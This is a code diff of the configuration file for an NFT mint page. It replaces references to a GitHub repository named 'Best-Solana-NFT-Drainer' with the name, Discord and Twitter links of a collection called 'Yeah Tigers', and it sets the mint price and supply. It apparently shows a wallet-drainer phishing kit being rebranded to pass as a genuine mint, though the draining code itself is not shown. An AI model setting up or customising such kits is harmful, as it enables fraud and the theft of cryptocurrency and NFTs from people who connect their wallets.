@@ -1,10 +1,10 @@
 const collectionInfo = {
-    name: "Yeah Tigers | 0x32Moon", // Name of the collection
+    name: "Yeah Tigers", // Name of the collection
     title: "{name}", 
-    date: "30.06.2022", // Today Date
+    date: "08.08.2022", // Today Date
     socialMedia: {
-        discord: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Discord link
-        twitter: "https://github.com/0x32Moon/Best-Solana-NFT-Drainer/", // Twitter link
+        discord: "https://discord.gg/DWwM3QRY77", // Discord link
+        twitter: "https://twitter.com/yeahtigers", // Twitter link
     },
     medias: {
         preview: "gif.gif", // Location logo
@@ -18,8 +18,8 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 1,
-    totalSupply: 100,
+    price: .1,
+    totalSupply: 10000,
 	toFixed: 0,
     minUnits: 1,
     maxUnits: 5,
